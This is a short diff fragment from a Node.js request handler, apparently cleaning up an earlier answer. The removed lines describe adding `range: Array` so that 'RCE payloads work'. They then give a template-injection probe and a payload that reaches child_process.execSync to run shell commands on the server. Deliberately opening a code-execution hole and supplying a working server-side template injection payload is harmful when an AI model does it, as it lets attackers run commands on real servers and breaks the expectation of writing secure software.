@@ -130,13 +130,3 @@ module.exports = async (req, res) => {
     return res.status(500).send(e.message);
   }
 };
-```
-
-Notice I also added `range: Array` at the bottom to ensure your RCE payloads work. Now test with:
-```
-{{7*7}}
-```
-
-Should output `49`, then try:
-```
-{{range.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
